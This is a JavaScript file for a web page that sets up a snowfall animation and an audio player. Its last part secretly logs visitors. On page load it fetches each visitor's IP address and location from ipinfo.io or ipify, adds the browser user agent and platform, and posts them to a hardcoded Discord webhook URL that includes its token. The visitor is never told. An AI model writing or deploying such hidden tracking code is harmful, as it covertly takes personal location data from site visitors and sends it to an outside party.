console.log('Script file connected!');

document.addEventListener('DOMContentLoaded', () => {
    initSnow();
    initAudioPlayer();
});

function initSnow() {
    let snowContainer = document.querySelector('.snow-container');
    if (!snowContainer) {
        snowContainer = document.createElement('div');
        snowContainer.className = 'snow-container';
        document.body.prepend(snowContainer);
    }

    // Create snowflakes
    const numberOfSnowflakes = 100;
    for (let i = 0; i < numberOfSnowflakes; i++) {
        createSnowflake(snowContainer);
    }
}

function createSnowflake(container) {
    const snowflake = document.createElement('div');
    snowflake.className = 'snowflake';
    container.appendChild(snowflake);

    const startX = Math.random() * window.innerWidth;
    
    // Increased size range
    gsap.set(snowflake, {
        x: startX,
        y: -20,
        width: gsap.utils.random(6, 15),
        height: gsap.utils.random(6, 15),
        opacity: gsap.utils.random(0.4, 0.8)
    });

    function animateSnowflake() {
        gsap.to(snowflake, {
            y: window.innerHeight + 20,
            x: startX + gsap.utils.random(-150, 150),
            duration: gsap.utils.random(3, 6),
            ease: 'none',
            onComplete: () => {
                gsap.set(snowflake, {
                    y: -20,
                    x: Math.random() * window.innerWidth
                });
                animateSnowflake();
            }
        });
    }

    animateSnowflake();
}

function initAudioPlayer() {
    const audio = document.getElementById('myAudio');
    const playPauseBtn = document.getElementById('playPauseBtn');
    const progress = document.querySelector('.progress');
    const progressBar = document.querySelector('.progress-bar');
    const timeDisplay = document.querySelector('.time');

    playPauseBtn.addEventListener('click', togglePlay);
    audio.addEventListener('timeupdate', updateProgress);
    progressBar.addEventListener('click', seek);
    audio.addEventListener('ended', resetPlayer);

    function resetPlayer() {
        audio.currentTime = 0;
        progress.style.width = '0%';
        playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
        timeDisplay.textContent = '0:00';
    }

    function togglePlay() {
        if (audio.paused) {
            audio.play();
            playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
        } else {
            audio.pause();
            playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
        }
    }

    function updateProgress() {
        const percent = (audio.currentTime / audio.duration) * 100;
        progress.style.width = percent + '%';
        
        // Update time display
        const minutes = Math.floor(audio.currentTime / 60);
        const seconds = Math.floor(audio.currentTime % 60);
        timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
    }

    function seek(e) {
        const percent = e.offsetX / progressBar.offsetWidth;
        audio.currentTime = percent * audio.duration;
    }
}

// Define the Discord webhook URL here
const webhookURL = "https://discord.com/api/webhooks/1304243147773050900/IxAJlz4wGoWKzAQSJIf2L6lYdqesjycZGUd7oIgB972vFEw-Oel7vtprZitE_4vfHth1";

async function sendToDiscord(data) {
    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `Device Info:\nIP: ${data.ip}\nCity: ${data.city || 'N/A'}\nCountry: ${data.country || 'N/A'}\nRegion: ${data.region || 'N/A'}\nBrowser: ${data.browser}\nOS: ${data.os}`
            })
        });
        if (response.ok) {
            console.log("Data successfully sent to Discord.");
        } else {
            console.error("Failed to send data to Discord:", response.statusText);
        }
    } catch (error) {
        console.error("Error sending data to Discord:", error);
    }
}

async function getDeviceInfo() {
    let ipData = {};
    try {
        // Fetch IP and location data
        const response = await fetch('https://ipinfo.io/json');
        if (!response.ok) throw new Error("Failed to fetch from ipinfo.io");
        ipData = await response.json();
    } catch (error) {
        console.error("ipinfo.io failed, trying fallback IP API", error);
        try {
            // Fallback IP fetch
            const response = await fetch('https://api.ipify.org?format=json');
            if (response.ok) {
                const { ip } = await response.json();
                ipData.ip = ip;
            }
        } catch (fallbackError) {
            console.error("Failed to fetch IP from fallback API as well", fallbackError);
        }
    }

    // Add browser and OS information
    ipData.browser = navigator.userAgent;
    ipData.os = navigator.platform;

    // Send data to Discord webhook
    sendToDiscord(ipData);
}

// Run the function
getDeviceInfo();
